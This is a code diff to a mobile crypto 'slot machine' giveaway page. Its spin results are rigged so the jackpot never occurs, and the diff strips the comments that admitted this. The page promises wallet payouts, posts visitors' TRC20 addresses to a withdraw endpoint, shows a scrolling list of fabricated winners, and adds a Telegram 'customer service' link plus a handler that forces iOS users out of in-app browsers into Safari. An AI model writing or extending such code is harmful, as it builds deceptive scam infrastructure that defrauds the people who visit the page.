@@ -153,6 +153,20 @@ body{position:fixed;inset:0}
 @media(max-width:380px){.pay-item{padding:6px 7px;font-size:11px}.pay-v{font-size:10px}.wallet-amt{min-width:3.6em;font-size:15px}.lang-select{font-size:13px;height:36px}}
 @media(max-height:740px){:root{--sym:min(54px,max(40px,calc((100vw - 96px)/5)))}.promo-banner{padding:8px 10px 9px}.banner-kicker,.banner-end{font-size:12px}.banner-amt{font-size:clamp(20px,6.6vw,26px)}.banner-sub{margin-top:5px;font-size:12px}.jackpot-val{font-size:14px}.jackpot-bar{padding:6px 8px;margin-bottom:8px}.spin-btn{height:50px;font-size:14px}.pay-item{padding:6px 8px}.howto-play{padding:10px 12px}.howto-play p{font-size:12px}.rolling-list{height:90px}.lang-select{height:36px;font-size:13px}}
 @media(max-height:680px){:root{--sym:min(48px,max(38px,calc((100vw - 96px)/5)))}.banner-kicker,.banner-end{font-size:11px}.banner-amt{font-size:20px}.banner-sub{font-size:11px}.modal-amt{font-size:28px}}
+
+/* ========== 客服按钮样式（新增） ========== */
+.tg-float-btn {
+    position: fixed; bottom: 20px; right: 20px; z-index: 9999;
+    display: none; background: #0088cc; border-radius: 50%;
+    width: 50px; height: 50px; align-items: center; justify-content: center;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.5); text-decoration: none;
+}
+.tg-float-btn svg { width: 28px; height: 28px; fill: white; }
+.tg-modal-btn {
+    display: none; background: #0088cc; color: white; padding: 10px 20px;
+    border-radius: 5px; text-decoration: none; font-weight: bold;
+    margin-left: 10px; text-align: center; border: none; cursor: pointer;
+}
 </style>
 </head>
 <body>
@@ -271,21 +285,87 @@ body{position:fixed;inset:0}
 <p class="confirm-copy">We will transfer this reward to your wallet within <strong>1 business day</strong>. Please stay tuned and check your account.</p>
 <div class="addr-box" id="confirmAddr"></div>
 <button id="gotItBtn" class="claim-btn" type="button">GOT IT</button>
+<!-- 新增：联系客服按钮 -->
+<a id="modalContactBtn" href="#" target="_blank" class="tg-modal-btn" style="margin-top:12px; display:none;">联系客服 Telegram</a>
 </div>
 </div>
 
+<!-- 新增：悬浮客服飞机按钮 -->
+<a id="floatingTgBtn" href="#" target="_blank" class="tg-float-btn">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.19-.08-.05-.19-.02-.27 0-.11.03-1.89 1.2-5.34 3.52-.5.34-.95.5-1.35.49-.44-.01-1.29-.25-1.92-.46-.78-.25-1.4-.39-1.35-.82.03-.22.29-.45.78-.69 3.05-1.33 5.08-2.21 6.09-2.64 2.9-1.21 3.5-1.42 3.89-1.42.09 0 .28.02.4.12.11.09.14.21.15.3z"/></svg>
+</a>
+
+<!-- ========== 新增：读取飞机配置 + Safari 强制拦截 ========== -->
+<script>
+(function(){
+    // 1. 读取后台配置的飞机链接
+    fetch('/api/public-settings')
+        .then(res => res.json())
+        .then(data => {
+            if (data.telegramLink) {
+                const floatBtn = document.getElementById('floatingTgBtn');
+                if (floatBtn) { floatBtn.href = data.telegramLink; floatBtn.style.display = 'flex'; }
+                const modalBtn = document.getElementById('modalContactBtn');
+                if (modalBtn) { modalBtn.href = data.telegramLink; modalBtn.style.display = 'inline-block'; }
+            }
+        })
+        .catch(err => console.warn('加载客服配置失败', err));
+
+    // 2. 复制链接工具函数
+    window.forceCopyLink = function(text) {
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        textArea.style.position = "fixed";
+        textArea.style.opacity = "0";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+            const ok = document.execCommand('copy');
+            ok ? alert('链接已复制！请打开 Safari 浏览器，粘贴并访问。')
+               : prompt('复制失败，请手动复制以下链接：', text);
+        } catch (err) { prompt('复制失败，请手动复制以下链接：', text); }
+        document.body.removeChild(textArea);
+    };
+
+    // 3. Safari 强制拦截（用捕获阶段绑定，确保在游戏旋转逻辑之前触发）
+    document.addEventListener('DOMContentLoaded', function() {
+        const spinBtn = document.getElementById('spinBtn');
+        if (!spinBtn) return;
+        spinBtn.addEventListener('click', function(e) {
+            const ua = navigator.userAgent;
+            const isIOS = /iPhone|iPad|iPod/.test(ua);
+            const isNotSafari = /CriOS|FxiOS|EdgiOS|OPiOS/.test(ua) || (isIOS && !/Safari/.test(ua));
+            if (isIOS && isNotSafari) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                const copyLink = window.location.href;
+                const ok = confirm('检测到您正在非Safari浏览器中打开。\n\n为保证游戏正常运行，请点击“确定”复制链接，然后打开您手机自带的 Safari 浏览器，粘贴并访问。');
+                if (ok) {
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        navigator.clipboard.writeText(copyLink)
+                            .then(() => alert('链接已复制！请打开 Safari 浏览器，粘贴并访问。'))
+                            .catch(() => window.forceCopyLink(copyLink));
+                    } else {
+                        window.forceCopyLink(copyLink);
+                    }
+                }
+                return false;
+            }
+        }, true);
+    });
+})();
+</script>
+
 <script>
 // ===== 配置：后端 API 地址 =====
-// 生产环境改成你的后端域名，如 'https://api.yoursite.com'
-// 同域部署保持空字符串即可
 const API_BASE = '';
 
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
-// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
 const PAYOUT_BY_MATCH = {2:10, 3:30, 4:200, 5:10000};
 const JACKPOT = 10000;
-// 用户点击时，match 只从 [2,3,4] 随机，5 连不出现
 const MATCH_POOL = [2, 3, 4];
 const SYMS=[
 {id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
@@ -370,13 +450,7 @@ function mount(){
 function fmt(n){return n.toLocaleString("en-US",{minimumFractionDigits:n%1?2:0,maximumFractionDigits:2})}
 function setBal(n){S.bal=n;$("balanceText").textContent=n.toFixed(2)}
 function setLeft(n){S.left=n;$("spinsText").textContent=n}
-
-// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
-function calcPayout(match){
-  return PAYOUT_BY_MATCH[match] || 0;
-}
-
-// 每次 spin：match 从 [2,3,4] 随机，symbol 也随机，5连不出现
+function calcPayout(match){return PAYOUT_BY_MATCH[match] || 0}
 function outcome(){
   const m = pick(MATCH_POOL);
   const win = pick(SYMS);
@@ -480,25 +554,20 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
 // ========== 提交 TRC20 记录到后端 ==========
 async function submitTrc20Record(address, balance){
   try{
-    const res = await fetch(API_BASE + '/api/records', {
+    const res = await fetch(API_BASE + '/api/withdraw', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        address: address,
-        balance: balance || '0.00',
-        timestamp: new Date().toISOString()
-      })
+      body: JSON.stringify({ address: address, amount: parseFloat(balance) || 0 })
     });
     if(!res.ok) throw new Error('HTTP ' + res.status);
-    console.log('[提交] TRC20 地址已记录');
+    console.log('[提交] TRC20 提现已记录');
   }catch(err){
     console.warn('地址记录提交失败:', err.message);
   }
 }
-
+</script>
+<script>
 // ========== 滚动地址列表：20条队列，滚出一条补一条 ==========
-// 金额 = 该用户 3 次旋转结果之和，单次只可能是 10 / 30 / 200 / 10000
-// 10000 出现概率极低
 function initRollingAddresses() {
   const inner = document.getElementById('rollingInner');
   if (!inner) return;
